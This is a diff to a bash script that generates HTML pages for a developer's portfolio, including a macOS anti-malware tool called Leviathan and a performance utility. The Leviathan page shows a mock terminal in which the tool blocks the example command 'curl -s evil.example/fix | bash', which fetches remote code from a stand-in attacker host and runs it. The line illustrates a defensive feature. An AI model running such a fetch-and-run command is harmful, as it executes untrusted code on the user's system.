@@ -1,7 +1,7 @@
 #!/bin/bash
 # Builds the three pages from shared header and footer.
 cd "$(dirname "$0")"
-H='<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght,SOFT,WONK@9..144,300..600,0..100,0..1&family=IBM+Plex+Mono:wght@400;500&family=Instrument+Sans:wght@400;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="/style.css?v=6">'
+H='<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght,SOFT,WONK@9..144,300..600,0..100,0..1&family=IBM+Plex+Mono:wght@400;500&family=Instrument+Sans:wght@400;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="/style.css?v=7">'
 TOP='<div class="wrap"><header class="top"><a class="name" href="/">Reed Ostrov</a><a class="mute mono" href="https://github.com/Questboy23">github &#8599;</a></header>'
 FOOT='<footer><span>Reed Ostrov &middot; made in Ohio</span><span>free &amp; open source &middot; macOS</span></footer></div></body></html>'
 
@@ -15,9 +15,9 @@ EOF
 
 cat > leviathan/index.html <<EOF
 $H<title>Leviathan</title><meta name="description" content="Leviathan protects a Mac from malware sites, harmful downloads and dangerous pasted commands."></head><body>$TOP
-<a class="back" href="/">&larr; all projects</a>
+<nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
 <section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--sea)"></i>Project 01 &middot; macOS &middot; v1.0</div><h1 class="serif" style="margin-top:16px">Leviathan</h1><p class="lede serif">It stops malware on your Mac before the malware can run.</p>
-<div class="actions"><a class="btn" href="https://github.com/Questboy23/leviathan/releases/latest/download/Leviathan.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/leviathan">View the code</a></div></div>
+<div class="actions"><a class="btn" href="https://github.com/Questboy23/leviathan/releases/latest/download/Leviathan.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><span class="size">.zip &middot; 79 KB</span><a class="link" href="https://github.com/Questboy23/leviathan">View the code</a></div></div>
 <figure class="win" aria-label="Example of the paste guard"><div class="bar"><i></i><i></i><i></i><span>Terminal</span></div><pre class="scr"><span class="dim">$</span> curl -s evil.example/fix | bash
 <b>Leviathan stopped this command.</b>
 It downloads a program and runs it
@@ -49,9 +49,9 @@ EOF
 
 cat > activity-monitored/index.html <<EOF
 $H<title>Activity Monitored</title><meta name="description" content="Activity Monitored keeps a Mac responsive when it is overloaded."></head><body>$TOP
-<a class="back" href="/">&larr; all projects</a>
+<nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
 <section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--mustard)"></i>Project 02 &middot; macOS</div><h1 class="serif" style="margin-top:16px">Activity Monitored</h1><p class="lede serif">Keeps your Mac quick when too much is running at once.</p>
-<div class="actions"><a class="btn" href="https://github.com/Questboy23/activity-monitored/archive/refs/heads/main.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/activity-monitored">View the code</a></div></div>
+<div class="actions"><a class="btn" href="https://github.com/Questboy23/activity-monitored/releases/latest/download/Activity-Monitored.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><span class="size">.zip &middot; 18 KB</span><a class="link" href="https://github.com/Questboy23/activity-monitored">View the code</a></div></div>
 <figure class="win" aria-label="Example of Activity Monitored at work"><div class="bar"><i></i><i></i><i></i><span>Activity Monitored</span></div><pre class="scr">Processor  <span class="meter"><i style="width:96%"></i></span> 96%
 <b>Busy. Asking 3 background programs to wait.</b>
   backup        lowered
